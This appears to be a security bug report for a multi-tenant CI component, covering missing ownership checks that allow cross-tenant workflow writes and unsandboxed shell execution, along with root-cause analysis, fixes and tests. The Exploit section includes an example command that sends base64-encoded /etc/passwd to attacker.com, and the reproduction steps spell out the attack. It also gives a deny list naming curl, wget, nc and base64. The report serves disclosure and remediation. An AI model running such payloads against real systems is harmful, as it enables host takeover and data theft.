---
bug_id: BUG-130
status: fixed
# Reconciled 2026-07-28: frontmatter read `open` while the registry read `fixed`.
# Source verification confirms the fix: verifyRepoOwnership (components/cici/cici.go)
# gates saveWorkflow/listWorkflows/triggerRun by git_repos.owner_id vs the request
# org, and executeStep calls validateCommand before exec.CommandContext. All six
# verify-step tests exist in components/cici/cici_test.go and pass. A live HTTP
# probe confirmed a cross-tenant workflow write returns 404.
# See specs/verifications/BUG-VALIDATION-2026-07-28.md
severity: critical
scope: cici
title: "RCE via cici workflows: IDOR → unsandboxed exec.CommandContext"
cwe:
  - CWE-78  # OS Command Injection
  - CWE-639  # Authorization Bypass Through User-Controlled Key
github_issue: 130
discovered: 2026-07-23
---

# CRITICAL: Remote Command Execution via cici workflows (IDOR → RCE)

## Affected Files
- `components/cici/workflows.go` — `saveWorkflow` (line 20)
- `components/cici/runs.go` — `triggerRun` (line 19), `executeStep` (line 95-96)

## Problem

Five endpoints in the cici component lack org_id ownership verification:

| Endpoint | Handler | Vulnerability |
|----------|---------|---------------|
| `PUT /api/cici/{repo}/workflows` | `saveWorkflow` | No check that repo belongs to caller's org |
| `POST /api/cici/{repo}/workflows/{id}/run` | `triggerRun` | Triggers workflow without ownership check |
| `GET /api/cici/{repo}/workflows` | `listWorkflows` | Lists any repo's workflows |
| `GET /api/cici/runs` | `handleRuns` | Lists all runs across all orgs |
| `GET /api/cici/runs/{id}/logs` | `getRunLogs` | Reads any run's logs |

The critical path is `saveWorkflow` → `triggerRun` → `executeStep`:
- `executeStep` calls `exec.CommandContext(ctx, "sh", "-c", command)` with the raw YAML `run:` value
- No sandboxing, no command validation, no org_id check

## Exploit

1. Attacker (org B) discovers a repo_id belonging to org A
2. `PUT /api/cici/{org-A-repo}/workflows` with YAML containing `run: curl attacker.com/$(cat /etc/passwd|base64)`
3. `POST /api/cici/{org-A-repo}/workflows/{id}/run` to trigger execution
4. `GET /api/cici/runs/{id}/logs` to read the output
5. Full host RCE, cross-tenant data exfiltration

## Root Cause

The `git_repos` table has an `owner_id` column (which IS the org_id), but the cici component never queries it. The auth middleware injects `OrgID` into the request context via `auth.OrgIDFromContext()`, but cici never reads it.

## Fix Approach

### Layer 1: Ownership verification (required)

Add an `verifyRepoOwnership(db, ctx, repoID) error` helper that:
1. Reads `owner_id` from `git_repos WHERE id = ?`
2. Compares against `auth.OrgIDFromContext(r.Context())`
3. Returns 403 if mismatch

Apply to `saveWorkflow`, `triggerRun`, `listWorkflows`.

### Layer 2: Run scoping (required)

Modify `handleRuns` to scope queries by org_id:
```sql
WHERE workflow_id IN (
  SELECT w.id FROM cici_workflows w
  JOIN git_repos g ON g.id = w.repo_id
  WHERE g.owner_id = ?
)
```

Modify `getRunLogs` to verify the run's workflow belongs to the caller's org.

### Layer 3: Command sandboxing (defense in depth)

Replace bare `exec.CommandContext(ctx, "sh", "-c", command)` with:
- Command allowlist validation (reject known-dangerous patterns: `curl`, `wget`, `nc`, `base64`, piping to network)
- Or: run in a namespaced container (future work, tracked separately)

## RCA: 4-Phase Root Cause Analysis

### Phase 1: Reproduce

1. Start BigBase with auth enabled
2. Create two orgs (org-A with repo "my-app", org-B attacker)
3. As org-B: `PUT /api/cici/my-app/workflows` with YAML containing `run: id > /tmp/pwned`
4. As org-B: `POST /api/cici/my-app/workflows/{id}/run`
5. As org-B: `GET /api/cici/runs/{id}/logs` — output contains uid=0(root)

Result: 403 should be returned at step 3. Instead, 201 Created is returned.

### Phase 2: Isolate

Code paths traced:
- `saveWorkflow` (`workflows.go:20`): reads `repoID` from URL path, inserts into DB without checking `git_repos.owner_id`
- `triggerRun` (`runs.go:19`): reads `workflowID`, calls `fetchWorkflow`, then `executeRun` — no org check
- `executeStep` (`runs.go:95-96`): `exec.CommandContext(ctx, "sh", "-c", command)` — raw shell exec
- Auth middleware injects `OrgID` into context (`auth/middleware.go:145`) — available but never read

### Phase 3: Hypothesize

| # | Hypothesis | Falsification | Status |
|---|-----------|---------------|--------|
| H1 | Missing org_id check in saveWorkflow | Add check → 403 on cross-tenant | **CONFIRMED** |
| H2 | Missing org_id check in triggerRun | Add check → 403 on cross-tenant | **CONFIRMED** |
| H3 | No run scoping by org | Scope query → cross-tenant runs hidden | **CONFIRMED** |
| H4 | exec.CommandContext is inherently unsafe | Any shell injection leads to RCE | **CONFIRMED** |

### Phase 4: Verify

Root cause confirmed: **5 endpoints in cici component lack org_id ownership verification**, combined with **unsandboxed shell execution**. The `git_repos.owner_id` column exists and maps repos to orgs, but cici never queries it. The auth middleware provides `OrgIDFromContext` but cici never calls it.

Fix: Add `verifyRepoOwnership` helper + scope all queries by org_id + add command validation.

---

## Verify Steps

1. `TestCICISaveWorkflowCrossTenantRejected` — PUT to another org's repo returns 403
2. `TestCICITriggerRunCrossTenantRejected` — trigger on another org's workflow returns 403
3. `TestCICIListWorkflowsScopedByOrg` — only returns workflows for caller's org repos
4. `TestCICIListRunsScopedByOrg` — only returns runs for caller's org
5. `TestCICIGetRunLogsCrossTenantRejected` — reading another org's run logs returns 403
6. `TestCICICommandInjectionBlocked` — malicious `run:` value is rejected
7. All existing cici tests continue to pass
8. `go test ./components/cici/... -v` — all pass
